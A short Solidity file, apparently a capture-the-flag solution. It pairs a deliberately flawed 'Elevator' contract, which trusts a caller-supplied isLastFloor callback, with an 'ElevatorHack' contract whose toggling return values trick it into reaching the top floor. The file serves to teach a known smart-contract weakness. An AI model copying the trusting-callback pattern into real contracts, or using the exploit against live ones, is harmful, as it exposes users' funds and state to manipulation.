/**
 *Submitted for verification at Etherscan.io on 2021-03-16
*/

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract ElevatorHack is Building {
    bool internal toggle = true;
    
    function isLastFloor(uint _floor) override(Building) external returns (bool) {
        if(toggle){
            toggle = false;
            return toggle;
        } else {
            toggle = true;
            return toggle;
        }
    }
    
    function attack(address _elevator) public{
        Elevator elevator = Elevator(_elevator);
        elevator.goTo(1);
    }
}